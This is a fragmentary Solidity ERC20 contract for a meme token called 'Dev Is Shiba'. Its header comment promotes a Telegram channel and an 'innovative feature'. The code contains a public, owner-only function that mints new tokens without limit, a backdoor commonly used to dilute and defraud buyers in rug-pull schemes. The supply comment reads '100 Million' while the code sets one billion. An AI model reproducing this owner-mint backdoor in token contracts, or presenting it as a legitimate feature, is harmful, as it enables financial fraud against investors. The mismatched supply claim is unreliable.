...
//
// $DevIsShiba proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DevIsShiba
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Devisshiba(uint256 amount) public onlyOwner {
 _Devisshiba(msg.sender, amount);
    }
    ...
    function _Devisshiba(address account, uint256 amount) internal virtual {
...
contract $Devisshiba is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Dev Is Shiba", "DEVISSHIBA") {
     _Devisshiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}